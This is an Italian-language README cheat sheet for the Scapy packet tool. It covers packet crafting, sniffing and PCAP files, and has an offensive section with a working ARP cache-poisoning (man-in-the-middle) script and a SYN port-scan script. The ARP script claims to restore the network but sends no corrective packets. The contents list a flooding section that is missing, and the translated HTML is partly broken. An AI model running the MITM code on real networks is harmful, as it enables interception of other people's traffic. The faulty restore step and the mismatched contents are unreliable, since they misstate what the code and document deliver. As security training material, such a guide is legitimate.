<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🐍 Scapy: foglio informativo completo

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███████╗ ██████╗ █████╗ ██████╗ ██╗   ██╗
  ██╔════╝██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝
  ███████╗██║     ███████║██████╔╝ ╚████╔╝ 
  ╚════██║██║     ██╔══██║██╔═══╝   ╚██╔╝  
  ███████║╚██████╗██║  ██║██║        ██║   
  ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝        ╚═╝   
       Interactive Packet Crafting, Sniffing & Forging Engine
```
<palign="centro">
  <img src="https://img.shields.io/badge/Scapy-Packet_Crafting-blue?style=for-the-badge" alt="Scapy">
  <img src="https://img.shields.io/badge/Author-Philippe_Biondi-orange?style=for-the-badge" alt="secdev">
  <img src="https://img.shields.io/badge/Language-Python-green?style=for-the-badge" alt="Python">
  <img src="https://img.shields.io/badge/Category-Network_Attacks-purple?style=for-the-badge" alt="Attacchi di rete">
</p>

<palign="centro">
  <b>🐍 Lo strumento interattivo definitivo per la manipolazione dei pacchetti basato su Python e la libreria in grado di falsificare, inviare, sniffare, sezionare e fuzzizzare pacchetti di rete arbitrari</b>
</p>

---

## 📋 Sommario

- [Panoramica e modello a strati di impilamento (`/`)](#-panoramica--modello-a-strati-di-impilamento-)
- [Installazione](#-installazione)
- [Avvio della shell interattiva](#-starting-the-interactive-shell)
- [Creazione di pacchetti di rete](#-crafting-network-packets)
  - [Handshake IP e TCP](#handshakes-ip-e-tcp)
  - [Ping ICMP e tracciamento](#icmp-ping--traceroute)
  - [Query DNS e risoluzione](#query-dns--risoluzione)
- [Invio e ricezione di pacchetti](#-invio--ricezione-pacchetti)
  - [Livello 3: `send()`, `sr()`, `sr1()`](#livello-3-invia-sr-sr1)
  - [Livello 2: `sendp()`, `srp()`, `srp1()`](#layer-2-sendp-srp-srp1)
- [Sniffing di pacchetti e gestione PCAP](#-packet-sniffing--pcap-handling)
  - [Cattura di pacchetti live (`sniff()`)](#capturing-live-packets-sniff)
  - [Lettura e scrittura di file PCAP](#reading--writing-pcap-files)
- [Attacchi di rete offensivi](#-attacchi-di-rete-offensivi)
  - [Avvelenamento da cache ARP (MITM)](#arp-cache-avvelenamento-mitm)
  - [Script di scansione della porta SYN](#syn-port-scanning-script)
  - [TCP SYN/Flooding ICMP](#tcp-syn--icmp-flooding)
- [Tabella di riferimento rapido](#-tabella-di-riferimento-rapido)
- [Considerazioni difensive e rilevamento](#-considerazioni-difensive--rilevamento)
- [Disclaimer legale](#-legal-disclaimer)

---

## 🎯 Panoramica e modello di strati impilabili (`/`)

Creato da **Philippe Biondi**, **Scapy** sostituisce dozzine di strumenti di rete monouso (ping, traceroute, arpspoof, nmap stub).

La genialità di Scapy sta nell'usare l'operatore di divisione di Python (`/`) per impilare insieme i livelli del protocollo:
```python
packet = Ether() / IP(dst="192.168.1.1") / TCP(dport=80, flags="S") / "Raw Payload"
```
Ogni campo del livello ha valori predefiniti sani che Scapy calcola automaticamente (checksum, lunghezze, indirizzi MAC, IP di origine).

---

## 📥Installazione
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y python3-scapy

# Python pip (Latest version)
pip install scapy

# Arch Linux
sudo pacman -S python-scapy
```
---

## 🚀 Avvio della Shell interattiva

Avvia la shell REPL interattiva (richiede i privilegi di root per creare socket grezzi):
```bash
sudo scapy
```
Ispeziona i protocolli e le funzioni disponibili all'interno di Scapy:
```python
>>> ls()          # List all supported network protocols (850+)
>>> ls(IP)        # List fields and defaults of the IP layer
>>> lsc()         # List available Scapy command functions
```
---

## 🛠️ Creazione di pacchetti di rete

### Handshake IP e TCP
```python
# Create a TCP SYN packet to web port 80
syn_pkt = IP(dst="192.168.1.50") / TCP(dport=80, flags="S")
syn_pkt.show()
```
### Ping e tracciamento ICMP
```python
# Send ICMP Echo Request and await single response (sr1)
reply = sr1(IP(dst="8.8.8.8")/ICMP(), timeout=2)
if reply:
    reply.show()

# Automated graphical TCP traceroute
ans, unans = traceroute(["8.8.8.8", "1.1.1.1"], dport=443, maxttl=20)
```
### Query e risoluzione DNS
```python
# Craft raw DNS A-record query to 8.8.8.8
dns_query = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com"))
response = sr1(dns_query, verbose=False)
print(response[DNS].summary())
```
---

## 📡 Invio e ricezione di pacchetti

Scapy separa la trasmissione per livello OSI:

### Livello 3: `send()`, `sr()`, `sr1()`
Funziona con intestazioni Ethernet assegnate dal kernel (inizia dal livello IP):
- `send(pkt)`: trasmette il pacchetto al livello 3; non aspetta una risposta.
- `sr(pkt)`: invia pacchetti e restituisce coppie con risposta e senza risposta `(ans, unans)`.
- `sr1(pkt)`: invia il pacchetto e restituisce solo il primo pacchetto di risposta.

### Livello 2: `sendp()`, `srp()`, `srp1()`
Framing Ethernet/data-link personalizzato (inizia da `Ether()`):
- `sendp(Ether() / IP(...), iface="eth0")`: invia frame Ethernet grezzo.
- `srp(Ether() / ARP(...))`: invia richiesta ARP e ricevi risposta.

---

## 🔍 Sniffing di pacchetti e gestione PCAP

### Acquisizione di pacchetti attivi (`sniff()`)
```python
# Sniff 10 packets on interface eth0
pkts = sniff(iface="eth0", count=10)

# Sniff with BPF (Berkeley Packet Filter) syntax
http_pkts = sniff(filter="tcp port 80 or port 443", count=20)

# Process packets with custom callback function
def packet_callback(packet):
    if packet.haslayer(TCP):
        print(f"[{packet[IP].src}:{packet[TCP].sport}] -> [{packet[IP].dst}:{packet[TCP].dport}]")

sniff(iface="eth0", prn=packet_callback, store=0)
```
### Lettura e scrittura di file PCAP
```python
# Save captured packets to standard Wireshark PCAP
wrpcap("capture.pcap", pkts)

# Read PCAP file into Scapy list
read_pkts = rdpcap("capture.pcap")
read_pkts[0].show()
```
---

## ⚔️ Attacchi di rete offensivi

### Avvelenamento da cache ARP (MITM)
Spoofing delle tabelle ARP per intercettare il traffico tra vittima e gateway:
```python
from scapy.all import *
import time

victim_ip = "192.168.1.105"
gateway_ip = "192.168.1.1"

# Craft deceptive ARP replies
victim_arp = ARP(op=2, pdst=victim_ip, psrc=gateway_ip)
gateway_arp = ARP(op=2, pdst=gateway_ip, psrc=victim_ip)

print("[*] Poisoning ARP tables...")
try:
    while True:
        send(victim_arp, verbose=False)
        send(gateway_arp, verbose=False)
        time.sleep(2)
except KeyboardInterrupt:
    print("[*] Restoring network...")
```
### Script di scansione della porta SYN
```python
def scan_port(ip, port):
    pkt = IP(dst=ip) / TCP(dport=port, flags="S")
    resp = sr1(pkt, timeout=1, verbose=False)
    if resp and resp.haslayer(TCP):
        if resp[TCP].flags == 0x12: # SYN-ACK received
            print(f"[+] Port {port} is OPEN")
            # Send RST to be polite
            send(IP(dst=ip)/TCP(dport=port, flags="R"), verbose=False)

scan_port("192.168.1.1", 80)
```
---

## ⚡ Tabella di consultazione rapida

| Obiettivo | Comando Scapy |
|-----------|---------------|
| **Avvia shell interattiva** | `sudo scapy` |
| **Ispeziona i campi del protocollo** | `ls(IP)` o `ls(TCP)` |
| **Invia pacchetto L3** | `send(IP(dst="1.1.1.1")/ICMP())` |
| **Invia e ricevi la prima risposta**| `resp = sr1(IP(dst="1.1.1.1")/ICMP())` |
| **Invia frame Ethernet L2** | `sendp(Ether()/IP(...), iface="eth0")` |
| **Annusa con filtro BPF** | `sniff(iface="eth0", filter="icmp", count=5)` |
| **Salva su PCAP** | `wrpcap("out.pcap", pkts)` |
| **Leggi da PCAP** | `pkts = rdpcap("in.pcap")` |

---

## 🛡️ Considerazioni difensive e rilevamento

1. **Ispezione ARP dinamica (DAI):** configura gli switch aziendali con DAI e snooping DHCP per eliminare risposte ARP gratuite contraffatte.
2. **Regole IDS/Suricata:** Rapide operazioni SYN semiaperte e combinazioni di flag TCP non valide (Xmas, NULL) generate da Scapy attivano avvisi IDS standard.

---

## ⚠️ Disclaimer legale

> [!ATTENZIONE]
> Scapy può generare pacchetti malformati che causano condizioni di negazione del servizio o intercettano dati privati. Deve essere rigorosamente utilizzato nelle valutazioni di sicurezza autorizzate e nelle reti di test isolate.